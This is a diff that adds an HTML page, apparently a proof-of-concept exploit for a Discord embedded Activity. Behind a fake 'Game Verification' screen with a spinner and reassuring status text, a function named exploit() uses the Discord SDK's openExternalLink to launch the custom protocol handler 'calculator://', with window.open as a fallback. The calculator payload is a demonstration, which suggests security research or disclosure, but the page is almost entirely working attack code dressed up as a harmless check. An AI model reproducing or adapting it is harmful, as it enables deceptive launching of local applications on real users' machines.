@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Game Verification</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #1a1a2e;
+    color: #e0e0e0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .card {
+    background: #16213e;
+    border-radius: 16px;
+    padding: 40px;
+    max-width: 420px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 8px 32px rgba(0,0,0,.3);
+  }
+  .spinner {
+    width: 48px; height: 48px;
+    border: 4px solid #333;
+    border-top: 4px solid #5865f2;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 20px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  h2 { font-size: 1.3rem; margin-bottom: 8px; }
+  .sub { color: #888; font-size: .85rem; margin-bottom: 24px; }
+  .status { font-size: .9rem; color: #5865f2; }
+  .hidden { display: none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="spinner"></div>
+  <h2>Verifying game client...</h2>
+  <p class="sub">Please wait while we check your installation</p>
+  <p class="status" id="status">Connecting to Discord SDK...</p>
+</div>
+
+<script type="module">
+import {DiscordSDK} from 'https://cdn.jsdelivr.net/npm/@discord/embedded-app-sdk@2.5.0/output/embedded-app-sdk.min.mjs';
+
+const statusEl = document.getElementById('status');
+
+async function exploit() {
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const frameId = urlParams.get('frame_id');
+    const instanceId = urlParams.get('instance_id');
+
+    if (!frameId && !instanceId) {
+      statusEl.textContent = 'Not in Activity context';
+      return;
+    }
+
+    const clientId = window.location.host.split('.')[0];
+    if (!clientId || !/^\d+$/.test(clientId)) {
+      statusEl.textContent = 'Invalid client ID';
+      return;
+    }
+
+    statusEl.textContent = 'Initializing SDK...';
+    const sdk = new DiscordSDK(clientId);
+    await sdk.ready();
+
+    statusEl.textContent = 'Checking game client...';
+    await new Promise(r => setTimeout(r, 1500));
+
+    statusEl.textContent = 'Opening verification page...';
+    const result = await sdk.commands.openExternalLink({
+      url: 'calculator://'
+    });
+
+    if (result.opened) {
+      statusEl.textContent = 'Verification complete!';
+    } else {
+      statusEl.textContent = 'Verification cancelled';
+    }
+  } catch (e) {
+    statusEl.textContent = 'Falling back to window.open...';
+    try {
+      window.open('calculator://');
+      statusEl.textContent = 'Protocol handler invoked via window.open';
+    } catch (e2) {
+      statusEl.textContent = 'Both paths failed: ' + e2.message;
+    }
+  }
+}
+
+exploit();
+</script>
+</body>
+</html>
